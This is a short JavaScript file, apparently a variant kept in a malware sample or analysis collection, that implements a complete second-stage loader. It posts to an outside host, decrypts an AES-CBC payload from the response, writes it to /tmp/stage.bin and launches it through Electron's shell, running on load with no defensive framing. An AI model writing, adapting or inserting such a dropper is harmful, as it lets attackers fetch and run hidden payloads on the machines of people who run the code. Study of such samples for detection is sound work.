// Plain-syntax variant of the same loader chain: Axios POST, AES-CBC
// decrypt of the response stage, executable drop, desktop-shell launch.
const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const { shell } = require('electron');

async function loadStage(url, keyHex) {
  const res = await axios.post(url, { id: 1 });
  const decipher = crypto.createDecipheriv(
    'aes-256-cbc',
    Buffer.from(keyHex, 'hex'),
    Buffer.alloc(16, 0)
  );
  const data = Buffer.concat([
    decipher.update(Buffer.from(res.data.blob, 'base64')),
    decipher.final()
  ]);
  fs.writeFileSync('/tmp/stage.bin', data);
  await shell.openPath('/tmp/stage.bin');
}

loadStage('https://ingest-07.example-ops.net/stage', '00'.repeat(32));
